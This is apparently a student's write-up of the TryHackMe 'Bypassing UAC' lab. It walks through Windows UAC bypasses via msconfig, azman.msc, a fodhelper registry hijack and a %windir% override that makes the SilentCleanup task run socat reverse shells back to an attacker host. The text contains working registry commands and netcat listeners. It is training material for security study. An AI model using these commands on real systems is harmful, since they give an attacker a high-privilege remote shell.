# Bypassing UAC

**Room Link:** [https://tryhackme.com/room/bypassinguac](https://tryhackme.com/room/bypassinguac)



## UAC: GUI based bypasses

### Case study: msconfig

**Victim(cmd)**

```
msconfig
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### Case study: azman.msc

**Victim(cmd)**

```
azman.msc
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

This will spawn a notepad process that we can leverage to get a shell. To do so, go to File->Open and make sure to select All Files in the combo box on the lower right corner. Go to C:\Windows\System32 and search for cmd.exe and right-click to select Open:

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



## UAC: Auto-Elevating Processes

### Case study: Fodhelper

**Victim(cmd)**

```
regedit
```

When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (ProgID) for each filetype, where the corresponding application is associated. Let's say you try to open an HTML file. A part of the registry known as the **HKEY\_CLASSES\_ROOT** will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the `shell/open/command` subkey for each file's ProgID. Taking the "htmlfile" ProgID as an example:

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

#### Putting it all together

One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but UAC is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell.

To connect to the backdoor, you can use the following command:

**Kali**

```
nc $VICTIM 9999
```

Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:

**Victim(cmd)**

```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:$KALI:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 4444
```

And then proceed to execute fodhelper.exe, which in turn will trigger the execution of our reverse shell:

**Victim(cmd)**

```
fodhelper.exe
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## UAC: Improving the Fodhelper Exploit to Bypass Windows Defender

Note: Be sure to disable Windows Defender for this task, or you may have some difficulties when running the exploit. Just run the provided shortcut on your machine's desktop to disable it.

To understand why we are picking Disk Cleanup, let's open the Task Scheduler and check the task's configuration:

**Victim(cmd)**

```
taskschd.msc
```



<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Here we can see that the task is configured to run with the **Users** account, which means it will inherit the privileges from the calling user. The **Run with highest privileges** option will use the highest privilege security token available to the calling user, which is a high IL token for an administrator. Notice that if a regular non-admin user invokes this task, it will execute with medium IL only since that is the highest privilege token available to non-admins, and therefore the bypass wouldn't work.

Checking the Actions and Settings tabs, we have the following:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

The task can be run on-demand, executing the following command when invoked:

```
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Since the command depends on environment variables, we might be able to inject commands through them and get them executed by starting the DiskCleanup task manually.

Luckily for us, we can override the %windir% variable through the registry by creating an entry in HKCU\Environment. If we want to execute a reverse shell using socat, we can set %windir% as follows (without the quotes):

```
"cmd.exe /c C:\tools\socat\socat.exe TCP:$KALI:4445 EXEC:cmd.exe,pipes &REM "
```

At the end of our command, we concatenate "\&REM " (ending with a blank space) to comment whatever is put after %windir% when expanding the environment variable to get the final command used by DiskCleanup. The resulting command would be (be sure to replace your IP address where needed):

```
cmd.exe /c C:\tools\socat\socat.exe TCP:$KALI:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Where anything after the "REM" is ignored as a comment.

## Putting it all together&#x20;

Let's set up a listener for a reverse shell with&#x20;

**Kali**

```
nc -lvp 4446
```

We will then connect to the backdoor provided on port 9999:&#x20;

**Kali**

```
nc $VICTIM 9999
```

And finally, run the following commands to write our payload to %windir% and then execute the DiskCleanup task (be sure to replace your IP address where needed):

**Victim(cmd)**

```
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:$KALI:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

## UAC: Environment Variable Expansion
